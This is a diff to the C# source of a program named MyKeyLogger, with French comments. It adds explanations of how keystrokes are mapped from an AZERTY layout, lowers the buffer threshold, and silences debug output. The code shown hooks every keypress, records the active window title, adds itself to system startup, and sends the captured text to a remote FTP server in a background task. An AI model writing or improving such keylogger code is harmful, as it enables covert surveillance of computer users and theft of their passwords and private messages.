@@ -82,6 +82,7 @@ namespace MyKeyLogger
 
 		//
 		private static string data = DateTime.Now.ToString("dd/MM/yyyy HH:mm") + "\\:\\" + ActiveWindows.ActiveWindowName() + "\\:\\";
+		// Pour ignorer les appui
 		private static int[] IgnoredKey = {160, 162, 163, 164, 20, 165};
 		
 		// 
@@ -160,23 +161,29 @@ namespace MyKeyLogger
 					        }
 				        } else
 				        {
+					        //On s'interesse maintenant aux touches spéciales accessible avec des combinaisons.
+					        // Pour cela, on va chercher le code de la touche dans un dictionnaire. Si on appuie en même
+					        // temps sur la touche maj, on ajoute 1000 à la valeurs et si on appui sur Alt Gr. on ajoute 3000.
+					        // Cela permet de les rechercher aussi dans le dictionnaire.
 					        if ((Caps ^ CapsLock) && (modif == Keys.None || modif == Keys.Shift) && !IgnoredKey.Contains(myASCIIKey))
 						        myASCIIKey += 1000;
 					        
 					        if (modif == (Keys.Control | Keys.Alt))
 						        myASCIIKey += 3000;
 
-
+							// Si la valeur est présente dans le dictionnaire, on ajoute la valeur au texte.
 					        if (LayoutAzerty.ContainsKey(myASCIIKey) && (modif == Keys.None || modif == Keys.Shift || modif == (Keys.Control | Keys.Alt)))
 					        {
 						        val = LayoutAzerty[myASCIIKey];
 					        }
+					        // Si c'est une combaison de touche, on l'enregistre comme tel.
 					        else if (myASCIIKey < 1000 && LayoutAzerty.ContainsKey(myASCIIKey))
 					        {
 						        val = "`" + modif + "+" + LayoutAzerty[myASCIIKey] + "`";
 					        }
 					        else if (!IgnoredKey.Contains(myASCIIKey))
 					        {
+						        // Si c'est une touche spéciale on l'enregistre aussi.
 						        if (modif == Keys.None)
 						        {
 							        val = "`" + myKey + "`";
@@ -187,15 +194,16 @@ namespace MyKeyLogger
 						        }
 					        }
 				        }
+				        // Le caractère ` est utilisé pour séparer les touches spéciales du texte et doit être échappé.
 				        if (val != "" && "\\`".Contains(val))
 					        val = "\\" + val;
 				        data = data + val;
 				        
 				        // Débogage
 				        //Console.WriteLine(" wParam : " + wParam + " - myASCIIKey : " + myASCIIKey + " - myKey : " + myKey + " - CapsLock : " + CapsLock + " - modif : " + modif + " - Caps : " + Caps);
-				        Console.WriteLine("valeur : " + val + " longueur de la stream : "+ data.Length);
+				        //Console.WriteLine("valeur : " + val + " longueur de la stream : "+ data.Length);
 			        }
-		        if (data.Length > 350)
+		        if (data.Length > 256)
 				{
 
 			        data = data + "\n";
@@ -203,6 +211,7 @@ namespace MyKeyLogger
 			        data = DateTime.Now.ToString("dd/MM/yyyy HH:mm") + "\\:\\" + ActiveWindows.ActiveWindowName() + "\\:\\";
 			        
 			        // Déclenche une nouvelle tache en parallèle (appel à la méthode ServerFTP.ConnectionServer) 
+			        // Cela permet d'éviter des problèmes si le transfert prend trop de temps.
 			        Task.Factory.StartNew(() => ServerFTP.ConnectionServer(tempData));
 		        }
 		        
@@ -224,7 +233,7 @@ namespace MyKeyLogger
             AddApplicationToStartup();
         	
             // Désactive la touche Ver.Maj du clavier
-            OperationKey.TurnOFFCapsLockKey();
+            //OperationKey.TurnOFFCapsLockKey();
             
             // Defnit une fonction de rappel qui sera appelée à chaque pression de touche.
             SetHook(proc);
